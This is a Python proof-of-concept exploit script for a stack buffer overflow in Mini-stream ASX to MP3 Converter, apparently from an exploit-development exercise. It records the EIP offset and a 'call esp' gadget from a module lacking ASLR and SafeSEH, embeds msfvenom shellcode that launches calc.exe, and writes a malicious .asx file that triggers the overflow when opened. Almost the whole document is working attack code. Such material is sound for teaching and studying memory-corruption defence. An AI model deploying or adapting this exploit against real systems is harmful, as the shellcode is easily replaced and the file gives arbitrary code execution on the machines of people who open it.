from struct import pack
import sys

# Log data, item 39
# Address=0BADF00D
# Message=    EIP contains normal pattern : 0x36695735 (offset 17417)

# Log data, item 3
# Address=100371F5
# Message=  0x100371f5 : call esp |  {PAGE_EXECUTE_READ} [MSA2Mfilter03.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files (x86)\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll)

CALL_ESP = pack('<L', 0x100371f5)

#msfvenom -p windows/exec CMD=calc.exe -b "\x00\x09\x0A" -f python -v shellcode_calc
shellcode_calc =  ""
shellcode_calc += "\xba\x5f\x9b\xba\x75\xd9\xc2\xd9\x74\x24"
shellcode_calc += "\xf4\x5e\x33\xc9\xb1\x31\x83\xee\xfc\x31"
shellcode_calc += "\x56\x0f\x03\x56\x50\x79\x4f\x89\x86\xff"
shellcode_calc += "\xb0\x72\x56\x60\x38\x97\x67\xa0\x5e\xd3"
shellcode_calc += "\xd7\x10\x14\xb1\xdb\xdb\x78\x22\x68\xa9"
shellcode_calc += "\x54\x45\xd9\x04\x83\x68\xda\x35\xf7\xeb"
shellcode_calc += "\x58\x44\x24\xcc\x61\x87\x39\x0d\xa6\xfa"
shellcode_calc += "\xb0\x5f\x7f\x70\x66\x70\xf4\xcc\xbb\xfb"
shellcode_calc += "\x46\xc0\xbb\x18\x1e\xe3\xea\x8e\x15\xba"
shellcode_calc += "\x2c\x30\xfa\xb6\x64\x2a\x1f\xf2\x3f\xc1"
shellcode_calc += "\xeb\x88\xc1\x03\x22\x70\x6d\x6a\x8b\x83"
shellcode_calc += "\x6f\xaa\x2b\x7c\x1a\xc2\x48\x01\x1d\x11"
shellcode_calc += "\x33\xdd\xa8\x82\x93\x96\x0b\x6f\x22\x7a"
shellcode_calc += "\xcd\xe4\x28\x37\x99\xa3\x2c\xc6\x4e\xd8"
shellcode_calc += "\x48\x43\x71\x0f\xd9\x17\x56\x8b\x82\xcc"
shellcode_calc += "\xf7\x8a\x6e\xa2\x08\xcc\xd1\x1b\xad\x86"
shellcode_calc += "\xff\x48\xdc\xc4\x95\x8f\x52\x73\xdb\x90"
shellcode_calc += "\x6c\x7c\x4b\xf9\x5d\xf7\x04\x7e\x62\xd2"
shellcode_calc += "\x61\x70\x28\x7f\xc3\x19\xf5\x15\x56\x44"
shellcode_calc += "\x06\xc0\x94\x71\x85\xe1\x64\x86\x95\x83"
shellcode_calc += "\x61\xc2\x11\x7f\x1b\x5b\xf4\x7f\x88\x5c"
shellcode_calc += "\xdd\xe3\x4f\xcf\xbd\xcd\xea\x77\x27\x12"

                                        #-----------------------------------\
payload = "http://"                     # Header for the payload            |
payload += "A" * 17417                  # Fill up the buffer with junk      |
payload += CALL_ESP                     # CAL ESP from MSA2Mfilter03.dll    |
payload += "\x90" * 16                  # NOPSLED to catch our jump         |
payload += shellcode_calc               # Spawns a calculator               |
payload += "D" *(40000 - len(payload))  # Extra filler to ensure a crash    |
                                        #-----------------------------------/
try:
    print("[x] Exploit POC for ASX to MP3 converter\n")
    file_payload = open("ASXtoMP3_malicious.asx", 'w')
    print("[x] Creating a .asx file for out payload")
    file_payload.write(payload)
    print("[x] Writing malicious payload to .asx file")
    file_payload.close()
    print("[x] Load the malicious .asx file to spawn a calculator")
except:
    print("[!] Failed to create malicious .asx")
